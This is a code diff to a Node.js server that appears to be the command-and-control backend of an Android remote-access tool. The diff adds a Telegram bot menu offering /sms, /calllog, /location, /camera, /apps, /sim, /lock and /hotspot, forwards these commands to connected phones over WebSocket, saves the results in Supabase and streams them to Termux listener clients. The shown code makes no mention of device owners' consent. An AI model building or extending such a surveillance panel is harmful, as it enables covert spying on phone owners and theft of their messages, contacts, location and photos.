@@ -36,8 +36,9 @@ if (SERVER_URL) {
   });
 }
 
-// ==================== Store connected devices ====================
-const devices = new Map(); // deviceId -> socket
+// ==================== Store connected clients ====================
+const devices = new Map();           // deviceId -> socket (Android)
+const termuxClients = new Map();     // socket.id -> { socket, deviceId }
 
 // ==================== Helper: Store command result in Supabase ====================
 async function storeResult(deviceId, command, result, type = null) {
@@ -65,38 +66,80 @@ async function updateDeviceLastSeen(deviceId, info = null) {
   }
 }
 
+// ==================== Telegram Keyboard Markup ====================
+const mainKeyboard = {
+  reply_markup: {
+    keyboard: [
+      ['/sms', '/calllog', '/location'],
+      ['/appusage', '/apps', '/camera'],
+      ['/hotspot on', '/hotspot off', '/lock'],
+      ['/unlock', '/sim', '/battery'],
+      ['/device', '/charging', '/custom']
+    ],
+    resize_keyboard: true,
+    one_time_keyboard: false
+  }
+};
+
 // ==================== WebSocket ====================
 io.on('connection', (socket) => {
   console.log('New client connected:', socket.id);
 
+  // Android device registration
   socket.on('register', async (data) => {
     const { deviceId, info } = data;
     if (deviceId) {
       devices.set(deviceId, socket);
       socket.deviceId = deviceId;
+      socket.isDevice = true;
       console.log(`Device registered: ${deviceId}`);
       await updateDeviceLastSeen(deviceId, info);
       socket.emit('registered', { status: 'ok' });
     }
   });
 
+  // Termux client registration (listens to a specific device)
+  socket.on('termuxListen', (data) => {
+    const { deviceId } = data;
+    if (deviceId) {
+      termuxClients.set(socket.id, { socket, deviceId });
+      socket.isTermux = true;
+      socket.listeningDevice = deviceId;
+      console.log(`Termux client ${socket.id} listening to ${deviceId}`);
+    }
+  });
+
+  // Command result from Android device
   socket.on('commandResult', async (data) => {
     const { command, result, chatId, type } = data;
     const deviceId = socket.deviceId;
-    if (deviceId) {
-      await storeResult(deviceId, command, result, type);
-      if (chatId) {
-        bot.sendMessage(chatId, result).catch(err => {
-          console.error('Failed to send Telegram message:', err);
-        });
+    if (!deviceId) return;
+
+    // Store in Supabase
+    await storeResult(deviceId, command, result, type);
+
+    // If this command came from Telegram (chatId present), send to Telegram
+    if (chatId) {
+      bot.sendMessage(chatId, result, { parse_mode: 'HTML' }).catch(err => {
+        console.error('Failed to send Telegram message:', err);
+      });
+    }
+
+    // Also send to any Termux client listening to this device
+    for (const [_, client] of termuxClients) {
+      if (client.deviceId === deviceId) {
+        client.socket.emit('commandResult', { command, result, type });
       }
     }
   });
 
   socket.on('disconnect', () => {
     console.log('Client disconnected:', socket.id);
-    if (socket.deviceId) {
+    if (socket.isDevice && socket.deviceId) {
       devices.delete(socket.deviceId);
+    }
+    if (socket.isTermux) {
+      termuxClients.delete(socket.id);
     }
   });
 });
@@ -107,15 +150,23 @@ app.post('/webhook', (req, res) => {
   if (update.message) {
     const chatId = update.message.chat.id;
     const text = update.message.text;
-    const deviceId = chatId.toString(); // assuming one device per chat
+    const deviceId = chatId.toString(); // using chat ID as device ID (one device per chat)
 
+    // Handle /start command
+    if (text === '/start') {
+      bot.sendMessage(chatId, 'Welcome! Select a command:', mainKeyboard)
+        .catch(console.error);
+      return res.sendStatus(200);
+    }
+
+    // Forward command to device if online
     const deviceSocket = devices.get(deviceId);
     if (deviceSocket) {
       deviceSocket.emit('command', { command: text, chatId });
       res.sendStatus(200);
     } else {
-      bot.sendMessage(chatId, 'Device is offline or not registered.')
-        .catch(err => console.error(err));
+      bot.sendMessage(chatId, '❌ Device is offline or not registered.')
+        .catch(console.error);
       res.sendStatus(200);
     }
   } else {
@@ -149,8 +200,6 @@ app.post('/sendCommand', async (req, res) => {
 });
 
 // ==================== API Endpoints for Termux Device Selection ====================
-
-// Get all registered devices (for Termux to list)
 app.get('/api/devices', async (req, res) => {
   const { data, error } = await supabase
     .from('devices')
@@ -160,7 +209,6 @@ app.get('/api/devices', async (req, res) => {
   res.json(data);
 });
 
-// Get command results for a device
 app.get('/api/results/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
   const limit = parseInt(req.query.limit) || 50;
@@ -174,24 +222,9 @@ app.get('/api/results/:deviceId', async (req, res) => {
   res.json(data);
 });
 
-// Get latest result of a specific type
-app.get('/api/latest/:deviceId/:type', async (req, res) => {
-  const { deviceId, type } = req.params;
-  const { data, error } = await supabase
-    .from('command_results')
-    .select('*')
-    .eq('device_id', deviceId)
-    .eq('type', type)
-    .order('created_at', { ascending: false })
-    .limit(1)
-    .single();
-  if (error) return res.status(404).json({ error: 'No data found' });
-  res.json(data);
-});
-
 // ==================== Health Check ====================
 app.get('/', (req, res) => {
-  res.send('Monitor Server is running with Supabase');
+  res.send('Monitor Server is running with Supabase and Telegram bot');
 });
 
 // ==================== Start Server ====================
